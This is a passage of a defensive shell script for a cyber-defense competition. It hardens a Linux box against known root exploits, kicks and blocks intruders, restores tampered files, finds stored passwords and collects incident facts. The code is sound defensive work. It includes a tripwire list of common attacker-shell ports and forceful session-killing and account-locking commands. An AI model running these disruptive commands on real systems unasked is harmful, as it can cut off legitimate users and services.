    byhand "sshd -T | grep -i -E 'maxauthtries|allowtcpforwarding|loglevel'   (what sshd really uses)"
}
h_undo_last() {   # take back the last line of the undo file
    hl=$(tail -n 1 "$HUNDO" 2>/dev/null)
    [ -n "$hl" ] || return 0
    h_revert "$hl"
    sed -i '$d' "$HUNDO" 2>/dev/null
}

h_pkexec() {
    h_step 4 "PwnKit: take the SUID bit off pkexec"
    hk_p=''
    for hk_c in /usr/bin/pkexec /bin/pkexec; do [ -u "$hk_c" ] && { hk_p=$hk_c; break; }; done
    [ -n "$hk_p" ] || { say "  pkexec is not SUID here (or not installed). Nothing to do."; return 0; }
    why "pkexec has had several root bugs (CVE-2021-4034 PwnKit). Without SUID it cannot be used to become root."
    say "  Risk: graphical admin prompts on a desktop stop working. Servers do not use it. This is the official workaround."
    yes_ask "chmod 0755 $hk_p?" || return 0
    hu_add "mode $hk_p $(stat -c '%a %U:%G' "$hk_p")"
    chmod 0755 "$hk_p" && say "  Done: $(ls -l "$hk_p")"
    autonote "harden: removed SUID from $hk_p (PwnKit workaround)"
}

h_perms() {
    h_step 5 "Permissions on password and config files (CIS 6.1 and 5.1)"
    hp_list='/etc/shadow 640
/etc/gshadow 640
/etc/shadow- 640
/etc/gshadow- 640
/etc/passwd 644
/etc/group 644
/etc/sudoers 440
/etc/ssh/sshd_config 600
/etc/crontab 600
/boot/grub/grub.cfg 600
/boot/grub2/grub.cfg 600
/root 700'
    hp_todo=$(printf '%s\n' "$hp_list" | while read -r hp_f hp_m; do
        [ -e "$hp_f" ] || continue
        hp_c=$(stat -c %a "$hp_f" 2>/dev/null) || continue
        [ $(( 0$hp_c & ~0$hp_m & 0777 )) -ne 0 ] && say "$hp_f $hp_c $hp_m"
    done
    for hp_f in /etc/ssh/ssh_host_*_key /etc/sudoers.d/*; do
        [ -f "$hp_f" ] || continue
        hp_m=600; case "$hp_f" in /etc/sudoers.d/*) hp_m=440 ;; esac
        hp_c=$(stat -c %a "$hp_f" 2>/dev/null) || continue
        [ $(( 0$hp_c & ~0$hp_m & 0777 )) -ne 0 ] && say "$hp_f $hp_c $hp_m"
    done)
    [ -n "$hp_todo" ] || { say "  Every one is already tight enough. Nothing to do."; return 0; }
    say "  Too open now (file, now, would be):"
    printf '%s\n' "$hp_todo" | sed 's/^/    /'
    why "a readable /etc/shadow gives red team every password hash (that is -50 points by itself); a writable"
    say "        passwd or sudoers file is a free root account."
    yes_ask "Tighten these?" || return 0
    printf '%s\n' "$hp_todo" | while read -r hp_f hp_c hp_m; do
        hu_add "mode $hp_f $hp_c $(stat -c '%U:%G' "$hp_f")"
        chmod "$hp_m" "$hp_f" && say "    $hp_f: $hp_c -> $hp_m"
    done
    autonote "harden: tightened permissions on password and config files"
}

h_history() {
    h_step 6 "Time stamps on every command in shell history"
    hh_f=/etc/profile.d/first30-history.sh
    [ -d /etc/profile.d ] || { say "  No /etc/profile.d on this box. Skipping."; return 0; }
    [ -f "$hh_f" ] && { say "  Already on."; return 0; }
    why "history then says WHEN each command ran, and is written right away. That is your incident report timeline."
    say "  Risk: none. It applies to new logins."
    yes_ask "Turn it on?" || return 0
    { say "# first30 harden: every command gets a time and is saved right away"
      say "HISTTIMEFORMAT='%F %T  '"
      say "export HISTTIMEFORMAT"
      say "case \"\$PROMPT_COMMAND\" in *'history -a'*) ;; *) PROMPT_COMMAND=\"history -a\${PROMPT_COMMAND:+; \$PROMPT_COMMAND}\" ;; esac"; } > "$hh_f"
    chmod 644 "$hh_f"
    hu_add "file $hh_f"
    say "  Done (new logins). See it: history | tail"
    autonote "harden: history time stamps ($hh_f)"
}

h_userns() {
    h_step 7 "Turn off user namespaces for normal accounts"
    hn_v=$(cat /proc/sys/user/max_user_namespaces 2>/dev/null)
    [ -n "$hn_v" ] || { say "  Not available on this kernel. Skipping."; return 0; }
    [ "$hn_v" = 0 ] && { say "  Already off."; return 0; }
    why "the public root exploits for the nf_tables bug (CVE-2024-1086) and many others need them. Turning"
    say "        them off is the standard workaround until the kernel is updated."
    say "  Risk: rootless containers (podman as a user, rootless docker) and some CI runners stop. Skip it on CI/CD boxes."
    yes_ask "Set user.max_user_namespaces to 0?" || return 0
    if h_sysctl_set user.max_user_namespaces 0; then
        [ -f /proc/sys/kernel/unprivileged_userns_clone ] && h_sysctl_set kernel.unprivileged_userns_clone 0
        autonote "harden: user namespaces off (user.max_user_namespaces=0)"
    fi
}

h_logs() {
    h_step 8 "Send this box's logs to your team's log box (or make this box the log box)"
    why "last year one reason the team lost: no central logging. Red team cleans logs on the box they own,"
    say "        but a copy on another box stays. Two parts: each box SENDS, one box RECEIVES."
    if ! have rsyslogd || [ ! -d /etc/rsyslog.d ]; then
        say "  rsyslog is not here. BusyBox syslog can send too: syslogd -R <log box>:514 (Alpine: SYSLOGD_OPTS in /etc/conf.d/syslog)."
        return 0
    fi
    ask "Type S to send logs to the log box, R to make THIS box the log box, or Enter to skip:"
    case "$ANS" in
        [Ss])
            ask "Address of your team's log box (from your lead):"
            valid_ip "$ANS" || { say "  Not an IPv4 address. Skipped."; return 0; }
            hl_f=/etc/rsyslog.d/90-first30-remote.conf
            say "# first30 harden: a copy of every log line goes to the team log box (UDP, never blocks this box)" > "$hl_f"
            say "*.* @$ANS:514" >> "$hl_f"
            hu_add "file $hl_f"
            hl_ip=$ANS ;;
        [Rr])
            hl_f=/etc/rsyslog.d/10-first30-logbox.conf
            { say "# first30 harden: this box receives logs from the team's boxes into /var/log/remote/<address>.log"
              say 'module(load="imudp")'
              say 'input(type="imudp" port="514")'
              say 'template(name="F30Remote" type="string" string="/var/log/remote/%FROMHOST-IP%.log")'
              say 'if ($fromhost-ip != "127.0.0.1") then { action(type="omfile" dynaFile="F30Remote") stop }'; } > "$hl_f"
            mkdir -p /var/log/remote && chmod 750 /var/log/remote
            hu_add "file $hl_f"
            hl_ip='' ;;
        *) return 0 ;;
    esac
    if have rsyslogd && ! rsyslogd -N1 >/dev/null 2>&1; then
        say "  rsyslog says the config has an error. Taking it back."; h_undo_last; return 0
    fi
    { systemctl restart rsyslog 2>/dev/null || service rsyslog restart 2>/dev/null || rc-service rsyslog restart 2>/dev/null; } >/dev/null
    say "  Done: $hl_f"
    if [ -n "$hl_ip" ]; then
        say "  Test it: logger first30-test, then on the log box: grep first30-test /var/log/remote/*.log"
        autonote "harden: sending logs to $hl_ip (UDP 514)"
    else
        say "  Open UDP 514 to your team's boxes on this box's firewall. Logs land in /var/log/remote/."
        autonote "harden: this box is the team log box (rsyslog UDP 514 -> /var/log/remote)"
    fi
}

h_oldsvc() {
    h_step 9 "Old plain-text services (telnet, rsh, rlogin, finger, tftp)"
    ho_l=" $(listen_ports) "
    ho_f=''
    for ho_p in 23 512 513 514 79 69; do case "$ho_l" in *" $ho_p "*) ho_f="$ho_f $ho_p" ;; esac; done
    [ -n "$ho_f" ] || { say "  None listening. Nothing to do."; return 0; }
    say "  Listening on:$ho_f"
    say "  Is one of them SCORED? Check the scoreboard first: a scored service must stay up."
    for ho_p in $ho_f; do
        ho_u=''
        if have systemctl; then
            for ho_c in telnet.socket inetd.service xinetd.service openbsd-inetd.service rsh.socket rlogin.socket rexec.socket tftp.socket tftpd-hpa.service fingerd.socket; do
                systemctl is-active "$ho_c" >/dev/null 2>&1 && { ho_u="$ho_u $ho_c"; }
            done
        fi
        if [ -n "$ho_u" ] && yes_ask "Port $ho_p: stop and disable$ho_u?"; then
            for ho_c in $ho_u; do
                systemctl disable --now "$ho_c" >/dev/null 2>&1 && hu_add "unit $ho_c" && say "    stopped $ho_c"
            done
            autonote "harden: stopped old plain-text service(s):$ho_u"
        elif [ -z "$ho_u" ]; then
            say "  Port $ho_p: stop it by hand (inetd line, rc.d script or service). See what runs it: ss -ltnp | grep :$ho_p"
        fi
    done
}

h_modules() {
    h_step 10 "Lock kernel modules (LAST step, cannot be undone without a reboot)"
    [ "$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)" = 1 ] && { say "  Already locked."; return 0; }
    [ -f /proc/sys/kernel/modules_disabled ] || { say "  Not available here. Skipping."; return 0; }
    why "most Linux rootkits are kernel modules. Once locked, nothing (not even root) can load a new module."
    say "  Risk: nothing new loads either: a new firewall feature or USB device may fail. Do this AFTER your"
    say "  firewall rules, blocks and tripwires are in place (they load their modules first). Ask your lead."
    yes_ask "Lock kernel modules until the next reboot?" || return 0
    printf '1\n' > /proc/sys/kernel/modules_disabled && say "  Locked." && autonote "harden: kernel modules locked (kernel.modules_disabled=1, until reboot)"
}

h_revert() {   # one undo line
    set -- $1
    case "$1" in
        sysctl) printf '%s\n' "$3" > "/proc/sys/$(printf '%s' "$2" | tr . /)" 2>/dev/null && say "  $2 back to $3" ;;
        mode) chmod "$3" "$2" 2>/dev/null; chown "$4" "$2" 2>/dev/null; say "  $2 back to $3 $4" ;;
        file) rm -f "$2" && say "  removed $2" ;;
        sshblock) sed -i '/^# first30 harden start$/,/^# first30 harden end$/d' "$2" && say "  removed the first30 block from $2" ;;
        unit) systemctl enable --now "$2" >/dev/null 2>&1 && say "  started $2 again" ;;
    esac
}

do_harden() {
    need_root
    say "== Harden this box, one step at a time"
    say "  Each step: what it does, why, the risk to scoring, then it asks. Enter skips a step."
    say "  Everything changed is saved, so 'sh first30.sh undo-harden' puts it back (except step 10)."
    say "  Checked against the competition rules: no step blocks the scoring engine, changes passwords,"
    say "  or turns off accounts or shells (rule 5.6.5 bans scripts that break normal use)."
    : >> "$HUNDO"
    h_kernel; h_persist; h_ssh; h_pkexec; h_perms; h_history; h_userns; h_logs; h_oldsvc; h_modules
    say ""
    say "Hardening done. Undo list: $HUNDO ($(grep -c . "$HUNDO" 2>/dev/null) changes). Undo all: sh first30.sh undo-harden"
    say "Run a hunt next: hardening changes show up in it, and the team notes say they were yours."
}

do_undo_harden() {
    need_root
    [ -s "$HUNDO" ] || { say "Nothing to undo: harden made no changes (or they were undone)."; return 0; }
    say "== Undo hardening ($(grep -c . "$HUNDO") changes, newest first)"
    yes_ask "Put everything back the way it was?" || return 0
    hu_ssh=0
    grep -q -E '^(sshblock|file .*sshd_config)' "$HUNDO" && hu_ssh=1
    awk '{l[NR] = $0} END {for (i = NR; i >= 1; i--) print l[i]}' "$HUNDO" | while read -r hu_l; do h_revert "$hu_l"; done
    mv "$HUNDO" "$HUNDO.undone_$TS"
    [ "$hu_ssh" = 1 ] && { hu_b=$(find_sshd) && "$hu_b" -t >/dev/null 2>&1 && reload_sshd; }
    autonote "undid hardening"
    say "Done."
}

# ---------------------------------------------------------------- kick
# End someone's session and keep them out: their terminals, their connections,
# and a block on their address. One target at a time (rule 5.6.5 bans scripts that
# cut everything at once). Rule 4.11 allows "active response mechanisms such as
# TCP resets": ss -K sends exactly that.
kick_show() {
    say "  Logged in now (who -u):"
    who -u 2>/dev/null | sed 's/^/    /'
    say "  Connections from other machines now (state, address, port, local port, pid, program):"
    conns | awk '$2 !~ /^127\./ && $2 != "::1"' | sed 's/^/    /' | head -20
}
do_kick() {
    need_root
    kick_main "$@"
    km_r=$?
    facts_done
    return $km_r
}
kick_main() {
    kt=$1
    say "== Kick: end a session or connection, and keep them out"
    kick_show
    if [ -z "$kt" ]; then
        [ -t 0 ] || { say "Usage: sh first30.sh kick <address | account | pts/N>"; return 1; }
        ask "Who? Type an address (like 10.197.114.55), an account name, or a terminal (like pts/3):"
        kt=$ANS
    fi
    [ -n "$kt" ] || return 0
    km_tty=$(tty 2>/dev/null | sed 's|^/dev/||')
    km_ip=$(printf '%s\n' "$SSH_CLIENT" | awk '{print $1}')
    facts_start "kick $kt"
    if valid_ip "$kt"; then
        case "$kt" in */*) say "  Kick one address, not a network: $kt"; return 1 ;; esac
        if is_protected "$kt"; then say "  $kt is PROTECTED (scoring engine, Black Team box or similar). Not touching it."; return 1; fi
        [ "$kt" = "$km_ip" ] && { say "  $kt is YOUR OWN connection. Not touching it."; return 1; }
        if [ -n "$OURNETS" ] && ! outside_nets "$kt"; then
            say "  WARNING: $kt is INSIDE your own networks: a teammate, the jump box, or a box red team owns."
        fi
        kk_t=$(who -u 2>/dev/null | awk -v ip="($kt)" '$NF == ip {print $2}' | sort -u | tr '\n' ' ')
        kk_lp=" $( { if have ss; then ss -ltnp 2>/dev/null | grep -o 'pid=[0-9]*' | cut -d= -f2
                    else netstat -ltnp 2>/dev/null | awk '{print $NF}' | sed -n 's|^\([0-9][0-9]*\)/.*|\1|p'; fi; } | sort -u | tr '\n' ' ') "
        kk_p=$(conns | awk -v ip="$kt" '$2 == ip && $5 != "-" {print $5}' | sort -u | while read -r kp; do
                case "$kk_lp" in *" $kp "*) continue ;; esac
                [ "$kp" = 1 ] || [ "$kp" = "$$" ] || [ "$kp" = "$PPID" ] || printf '%s ' "$kp"
            done)
        say "  Plan for $kt:"
        [ -n "$kk_t" ] && say "    end their terminal sessions: $kk_t"
        [ -n "$kk_p" ] && say "    stop the programs connected to them: $(for kp in $kk_p; do printf '%s(%s) ' "$kp" "$(cat /proc/"$kp"/comm 2>/dev/null)"; done)"
        say "    reset every TCP connection with $kt (ss -K), and block it in and out"
        yes_ask "Kick $kt?" || return 0
        for kp in $kk_p; do
            fact "process $kp ($(tr '\0' ' ' < /proc/"$kp"/cmdline 2>/dev/null | cut -c1-150)) talked to $kt"
            [ -e "/proc/$kp/exe" ] && say "    saving evidence of pid $kp first" && ( do_evidence "/proc/$kp/exe" ) >/dev/null 2>&1
        done
        for kt_t in $kk_t; do
            [ "$kt_t" = "$km_tty" ] && continue
            if pkill -9 -t "$kt_t" 2>/dev/null; then say "    ended session on $kt_t"; fact "ended session on $kt_t from $kt"
            else say "    could not end $kt_t here: kill its programs by hand (ps -ef | grep $kt_t)"; fi
        done
        for kp in $kk_p; do kill -9 "$kp" 2>/dev/null && say "    stopped pid $kp"; done
        if have ss && ss -K dst "$kt" >/dev/null 2>&1; then say "    reset open TCP connections with $kt"; else say "    (this kernel cannot reset connections; the block below cuts them instead)"; fi
        ( do_block "$kt" ) | grep -E 'blocked|skipped|could not'
        fact "blocked $kt in and out"
        autonote "kicked $kt (sessions: ${kk_t:-none}; programs: ${kk_p:-none}) and blocked it"
    elif [ "${kt#pts/}" != "$kt" ] || [ "${kt#tty}" != "$kt" ]; then
        [ "$kt" = "$km_tty" ] && { say "  $kt is YOUR OWN terminal. Not touching it."; return 1; }
        say "  On $kt now: $(who -u 2>/dev/null | awk -v t="$kt" '$2 == t' | head -1)"
        ps -t "$kt" -o pid=,user=,args= 2>/dev/null | sed 's/^/    /' | head -10
        yes_ask "End everything on $kt?" || return 0
        if pkill -9 -t "$kt" 2>/dev/null; then say "  ended $kt"; fact "ended terminal $kt"
        else say "  could not end $kt here: kill its programs by hand (ps -ef | grep $kt)"; fi
        autonote "kicked terminal $kt"
    elif getent passwd "$kt" >/dev/null 2>&1; then
        ku_id=$(id -u "$kt" 2>/dev/null)
        say "  Account $kt (UID $ku_id). Its processes now:"
        ps -u "$kt" -o pid=,etime=,args= 2>/dev/null | sed 's/^/    /' | head -15
        if [ "${ku_id:-0}" -lt 1000 ] || [ "$kt" = root ]; then
            say "  $kt is a system account: it may run a scored service (web, database, mail). Killing all its"
            say "  programs stops that service. Kick its session by terminal (pts/N) or address instead."
            return 1
        fi
        yes_ask "Stop every program of $kt?" || return 0
        pkill -9 -u "$kt" 2>/dev/null && say "  stopped everything $kt was running" && fact "stopped all processes of $kt"
        say "  Scored user? Then do NOT lock it: change its password and file a PCR instead."
        if yes_ask "Also lock $kt (no password logins until unlocked: passwd -u $kt)?"; then
            { passwd -l "$kt" >/dev/null 2>&1 || usermod -L "$kt" 2>/dev/null; } && say "  locked $kt" && fact "locked account $kt"
            say "  A locked password does not stop SSH keys: check ~$kt/.ssh/authorized_keys too."
        fi
        autonote "kicked account $kt"
    else
        say "  $kt is not an IPv4 address, a terminal, or an account on this box."
        return 1
    fi
    remind "incident report: kicked $kt on $HOST at $(date '+%H:%M') (facts: $FACTS)"
    say "Facts for the incident report: $FACTS"
    say "Next: find how they got in (sh first30.sh hunt, and trace the address: sh first30.sh trace <address>)."
}

# ---------------------------------------------------------------- restore
# Put a file or folder back from the start-of-game backup: a defaced web page, a
# poisoned config. The bad version is saved as evidence first.
do_restore() {
    need_root
    rs_p=$1
    if [ -z "$rs_p" ]; then
        [ -t 0 ] || { say "Usage: sh first30.sh restore </full/path/to/file-or-folder>"; return 1; }
        ask "Full path of the file or folder to put back (like /var/www/html/index.php):"
        rs_p=$ANS
    fi
    case "$rs_p" in /*) ;; *) say "  Give the full path, starting with /"; return 1 ;; esac
    rs_p=$(printf '%s' "$rs_p" | sed 's|/*$||')
    rs_b=$(ls -1tr "$VAULT"/backup_"$HOST"_*.tgz 2>/dev/null | head -1)
    [ -n "$rs_b" ] || { say "  No backup in $VAULT yet. Make one at the start of the game (menu 1)."; return 1; }
    rs_rel=${rs_p#/}
    if ! tar -tzf "$rs_b" 2>/dev/null | grep -q -x -F -e "$rs_rel" -e "$rs_rel/"; then
        say "  $rs_p is not in the start-of-game backup ($rs_b)."
        say "  The backup has: $(tar -tzf "$rs_b" 2>/dev/null | cut -d/ -f1-2 | sort -u | head -12 | tr '\n' ' ')"
        return 1
    fi
    say "== Restore $rs_p from the backup made $(date -r "$rs_b" '+%H:%M')"
    rs_t="$VAULT/.restore.$$"
    rm -rf "$rs_t"; mkdir -p "$rs_t"
    tar -xzf "$rs_b" -C "$rs_t" "$rs_rel" 2>/dev/null
    if [ -f "$rs_t/$rs_rel" ]; then
        if [ ! -e "$rs_p" ]; then say "  It is GONE now. The backup copy will be put back."
        elif cmp -s "$rs_t/$rs_rel" "$rs_p"; then say "  It is the same as the backup. Nothing to do."; rm -rf "$rs_t"; return 0
        else
            say "  Differences (- backup, + now), first 40 lines:"
            if have diff; then diff -u "$rs_t/$rs_rel" "$rs_p" 2>/dev/null | sed -n '3,42p' | sed 's/^/    /'
            else say "    (no diff program here; sizes: backup $(wc -c < "$rs_t/$rs_rel"), now $(wc -c < "$rs_p") bytes)"; fi
        fi
        yes_ask "Save the current version as evidence, then put the backup back?" || { rm -rf "$rs_t"; return 0; }
        [ -e "$rs_p" ] && ( do_evidence "$rs_p" ) >/dev/null 2>&1 && say "  saved the current version in $VAULT/quarantine"
        if [ -e "$rs_p" ] && lsattr -d "$rs_p" 2>/dev/null | grep -q '^[^ ]*i'; then chattr -i "$rs_p" && say "  it was locked with chattr +i (red team does that); unlocked it"; fi
        mkdir -p "$(dirname "$rs_p")"
        cp -p "$rs_t/$rs_rel" "$rs_p" && say "  restored: $(ls -l "$rs_p")"
        have restorecon && restorecon "$rs_p" 2>/dev/null
        autonote "restored $rs_p from the start-of-game backup"
    else
        say "  Folder. Comparing every file with the backup..."
        rs_ch="$VAULT/.restore_list.$$"
        ( cd "$rs_t" && find "$rs_rel" -type f 2>/dev/null ) | while read -r rs_f; do
            if [ ! -e "/$rs_f" ]; then say "MISSING /$rs_f"; elif ! cmp -s "$rs_t/$rs_f" "/$rs_f"; then say "CHANGED /$rs_f"; fi
        done > "$rs_ch"
        rs_new=$(find "$rs_p" -type f 2>/dev/null | while read -r rs_f; do [ -e "$rs_t${rs_f}" ] || say "$rs_f"; done | head -30)
        if [ ! -s "$rs_ch" ] && [ -z "$rs_new" ]; then say "  Everything matches the backup."; rm -rf "$rs_t" "$rs_ch"; return 0; fi
        [ -s "$rs_ch" ] && { say "  Changed or missing ($(grep -c . "$rs_ch")):"; head -30 "$rs_ch" | sed 's/^/    /'; }
        [ -n "$rs_new" ] && { say "  NEW files that were not there at the start (web shells hide like this):"; say "$rs_new" | sed 's/^/    /'; }
        if [ -s "$rs_ch" ] && yes_ask "Save the folder as evidence, then put back the changed and missing files?"; then
            ( do_evidence "$rs_p" ) >/dev/null 2>&1 && say "  saved the whole folder as evidence first"
            while read -r rs_s rs_f; do
                [ -e "$rs_f" ] && lsattr -d "$rs_f" 2>/dev/null | grep -q '^[^ ]*i' && chattr -i "$rs_f"
                mkdir -p "$(dirname "$rs_f")"
                cp -p "$rs_t$rs_f" "$rs_f" && say "    restored $rs_f"
            done < "$rs_ch"
            have restorecon && restorecon -R "$rs_p" 2>/dev/null
            autonote "restored $(grep -c . "$rs_ch") files under $rs_p from the start-of-game backup"
        fi
        [ -n "$rs_new" ] && say "  The NEW files were left alone. For each one: sh first30.sh evidence <file>, then remove it if it is not your team's."
        rm -f "$rs_ch"
    fi
    rm -rf "$rs_t"
    say "  If a service uses it, test the config, then restart it (nginx -t, apache2ctl -t, sshd -t...)."
}

# ---------------------------------------------------------------- password finder
# Where is a password written down? Last year: default passwords left in config
# files, and a wiki with the password on it. Red team greps for them. And after
# you change a password, every place still holding the OLD one breaks its app
# (Keycloak at Invitational 2 logged in to AD with the old Administrator password).
do_findpass() {
    need_root
    say "== Where is this password written down?"
    why "red team searches files for passwords (that is -50 points per find), and an app holding the OLD"
    say "        password breaks the moment you change it. The password is typed hidden and searched from a"
    say "        root-only temporary file, never put on a command line (ps would show it to everyone)."
    read_secret "Type the password to look for (not shown, not saved):"
    [ -n "$SECRET" ] || { say "  Nothing typed."; return 0; }
    fp_f="$VAULT/.fp.$$"
    ( umask 077; printf '%s\n' "$SECRET" > "$fp_f" )
    SECRET=''
    say "  Searching configs, web roots, homes, scripts and histories (up to 60 seconds)..."
    fp_r=$(timeout 60 grep -r -l -I -F -f "$fp_f" /etc /var/www /srv /opt /home /root /usr/local /var/spool/cron /var/backups /var/lib/tomcat* \
        /tmp /var/tmp 2>/dev/null | grep -v -F "$VAULT" | head -60)
    rm -f "$fp_f"
    if [ -z "$fp_r" ]; then
        ok "not found in those folders"
    else
        say "  Found in $(printf '%s\n' "$fp_r" | grep -c .) files (only the names; nothing is printed from inside them):"
        printf '%s\n' "$fp_r" | while read -r fp_x; do
            fp_o=''; stat -c %a "$fp_x" 2>/dev/null | awk '{exit !(substr($1, length($1)) + 0 >= 4)}' && fp_o='   <- EVERY account can read this'
            say "    $fp_x$fp_o"
        done
        say "  For each file: is it an app's login (database, LDAP, mail)? Then change the password there too when you"
        say "  change it, restart that app, and file a PCR if the scorer uses it. Shell histories: delete those lines."
        autonote "password finder: found a password in $(printf '%s\n' "$fp_r" | grep -c .) files"
        remind "update or remove the password found in $(printf '%s\n' "$fp_r" | grep -c .) files on $HOST (see the last password-finder run)"
    fi
    say "  Databases hold passwords too. To search one by hand: mysqldump --all-databases | grep -c -F -e '<the password>'"
    say "  (Placeholder: type the real password where it says <the password>, and clear history after: history -c)"
}

# ---------------------------------------------------------------- incident facts
do_facts() {
    need_root
    ff_t=$1
    say "== Incident facts (your team writes the report; this collects facts and proof only)"
    say "  A report needs (rule 9.4): what happened, with source and destination addresses and times,"
    say "  passwords taken, access gained, damage done; what was affected; and the fix. AI-written reports score zero."
    if [ -z "$ff_t" ]; then
        [ -t 0 ] || { say "Usage: sh first30.sh facts <address | account | /path/to/file>"; return 1; }
        ask "What is it about? An address (like 10.197.114.55), an account name, or a full file path:"
        ff_t=$ANS
    fi
    [ -n "$ff_t" ] || return 0
    facts_start "$ff_t"
    {
        say "----- facts collected by first30 -----"
        if valid_ip "$ff_t"; then
            say "source address: $ff_t   (outside your networks: $(outside_nets "$ff_t" && echo yes || echo 'no or unknown'))"
            say "destination: this box, $HOST"
            ( do_trace "$ff_t" ) 2>/dev/null | sed 's/^/  /'
            say "logins from it (last 6):"
            auth_log 2>/dev/null | grep -F -w -- "$ff_t" | grep -E 'Accepted|Failed|Invalid user' | tail -6 | sed 's/^/  /'
            if [ -s "$VAULT/trip.txt" ]; then
                say "tripwire hits from it: $(trip_hits '-24h' | awk -v ip="$ff_t" '$2 == ip {print $1 " packets to ports" substr($0, index($0, $3) - 1)}')"
            fi
        elif getent passwd "$ff_t" >/dev/null 2>&1; then
            say "account: $(getent passwd "$ff_t")"
            say "groups: $(id "$ff_t" 2>/dev/null)"
            say "sudo rights: $(sudo -l -U "$ff_t" 2>/dev/null | grep -E '^ +\(' | tr -s ' ' | tr '\n' ';')"
            say "logins (last 8):"
            last -a "$ff_t" 2>/dev/null | head -8 | sed 's/^/  /'
            auth_log 2>/dev/null | grep -w -F -- "$ff_t" | grep -E 'Accepted|Failed|session opened|sudo' | tail -8 | sed 's/^/  /'
            say "running now:"
            ps -u "$ff_t" -o pid=,etime=,args= 2>/dev/null | head -10 | sed 's/^/  /'
            say "its cron: $(crontab -l -u "$ff_t" 2>/dev/null | grep -v '^#' | tr '\n' ';')"
        elif [ -e "$ff_t" ] || grep -q -F -- "$ff_t" "$VAULT/quarantine/evidence_log.txt" 2>/dev/null; then
            say "file: $ff_t"
            [ -e "$ff_t" ] && say "now: $(ls -ld "$ff_t")   sha256 $(sha256sum "$ff_t" 2>/dev/null | cut -d' ' -f1)"
            [ -e "$ff_t" ] && say "times: $(stat -c 'changed %z | modified %y' "$ff_t" 2>/dev/null)"
            say "evidence log:"
            grep -A3 -F -- "$ff_t" "$VAULT/quarantine/evidence_log.txt" 2>/dev/null | head -12 | sed 's/^/  /'
        else
            say "(not an address, account or file on this box: notes only)"
        fi
        say "team notes that mention it:"
        grep -F -- "$ff_t" "$NOTES" 2>/dev/null | tail -10 | sed 's/^/  /'
        say ""
        say "----- proof the threat is gone (run again before you hand in the report) -----"
        say "checked at $(date '+%H:%M:%S'):"
        if valid_ip "$ff_t"; then
            ff_c=$(conns | awk -v ip="$ff_t" '$2 == ip')
            say "  open connections with $ff_t: ${ff_c:-none}"
            say "  blocked: $(grep -F -- "$ff_t" "$VAULT/blocked.txt" 2>/dev/null | head -1)"
        elif getent passwd "$ff_t" >/dev/null 2>&1; then
            say "  account state: $(passwd -S "$ff_t" 2>/dev/null)"
            say "  processes running as it: $(ps -u "$ff_t" -o pid= 2>/dev/null | grep -c .)"
        elif [ -n "$ff_t" ]; then
            if [ -e "$ff_t" ]; then say "  $ff_t STILL EXISTS"; else say "  $ff_t no longer exists"; fi
            say "  running from it: $(proc_table; awk -v f="$ff_t" '{p = $1; $1 = ""; sub(/^ /, ""); if (index($0, f) == 1) print p}' "$PTAB" | tr '\n' ' ')"
        fi
        ff_h=$(ls -1t "$VAULT"/hunt_"$HOST"_*[0-9].txt 2>/dev/null | head -1)
        [ -n "$ff_h" ] && say "  MITRE techniques of what your latest hunt found: $(sed -n '/^SUMMARY/,/^For each one/p' "$ff_h" | grep -o -E 'T1[0-9]{3}(\.[0-9]{3})?' | sort -u | tr '\n' ' ')"
        say ""
        say "----- your team writes these, in your own words -----"
        say "What happened (timeline):"
        say "What was affected (services, accounts, data):"
        say "How we fixed it, and how we keep it fixed (remediation plan):"
    } >> "$FACTS" 2>/dev/null
    sed 's/^/  /' "$FACTS"
    say ""
    say "Saved: $FACTS"
    say "Persistence penalties can drop by up to half when the report shows it was removed: keep the proof section."
    remind "incident report: write it from $FACTS"
}

# ---------------------------------------------------------------- tripwire ports
# A scanner touches every port. Nothing on this box uses these ports, so any packet
# to them is someone looking around: the kernel log line has their address. It only
# LOGS (rule 4.11 is about blocking the scorer; logging blocks nothing). It does
# not block by itself, because your own team's scans would trip it too.
TRIP_PORTS='4444 1337 31337 5555 6667 9001 12345 2323'
trip_ports_free() {
    tp_l=" $(listen_ports) "
    for tp_p in $TRIP_PORTS; do case "$tp_l" in *" $tp_p "*) ;; *) printf '%s ' "$tp_p" ;; esac; done
}
# Kernel log lines: from the journal since $1 when it has them, otherwise from the
# first place this box keeps them (kern.log, messages, BusyBox logread, dmesg).
klog() {
    kl_o=''
    have journalctl && kl_o=$(journalctl -k -q --no-pager --since "$1" 2>/dev/null)
    if [ -n "$kl_o" ]; then printf '%s\n' "$kl_o"; KLOG_SRC=journal; return 0; fi
    KLOG_SRC=all
    if [ -s /var/log/kern.log ]; then cat /var/log/kern.log
    elif [ -s /var/log/messages ]; then cat /var/log/messages
    elif have logread; then logread 2>/dev/null
    else dmesg 2>/dev/null; fi
}
trip_sum() {   # tripwire log lines on stdin -> "count address ports..." lines
    grep 'first30-trip' | sed -n 's/.* SRC=\([0-9.]*\) .* DPT=\([0-9]*\) .*/\1 \2/p' |
        awk '{n[$1]++; if (!s[$1 " " $2]++) p[$1] = p[$1] " " $2} END {for (a in n) print n[a], a, p[a]}' | sort -rn | head -10
}
trip_hits() {   # trip_hits SINCE
    klog "$1" | trip_sum
}
do_trip() {
    need_root
    case "$1" in
        on)
            [ -s "$VAULT/trip.txt" ] && { say "Tripwire is already on: $(cat "$VAULT/trip.txt")"; return 0; }
            tr_p=$(trip_ports_free)
            tr_csv=$(printf '%s' "$tr_p" | sed 's/ *$//; s/ /,/g')
            [ -n "$tr_csv" ] || { say "Every tripwire port is in use here. Nothing to do."; return 1; }
            if fw_firewalld; then
                firewall-cmd --direct --add-rule ipv4 filter INPUT 0 -p tcp -m multiport --dports "$tr_csv" --syn -m limit --limit 20/min -j LOG --log-prefix 'first30-trip: ' >/dev/null 2>&1 && tr_m=firewalld
            elif have iptables && iptables -S INPUT >/dev/null 2>&1; then
                iptables -I INPUT -p tcp -m multiport --dports "$tr_csv" --syn -m limit --limit 20/min -j LOG --log-prefix 'first30-trip: ' 2>/dev/null && tr_m=iptables
            elif have nft; then
                if ! nft list table inet first30 >/dev/null 2>&1; then
                    nft add table inet first30 && nft add chain inet first30 in '{ type filter hook input priority -10 ; policy accept ; }' &&
                        nft add chain inet first30 out '{ type filter hook output priority -10 ; policy accept ; }'
                fi
                nft add rule inet first30 in tcp dport "{ $(printf '%s' "$tr_csv" | sed 's/,/, /g') }" ct state new limit rate 20/minute log prefix '"first30-trip: "' 2>/dev/null && tr_m=nft
            fi
            [ -n "$tr_m" ] || { say "Could not add the tripwire (no working iptables, nft or firewalld)."; return 1; }
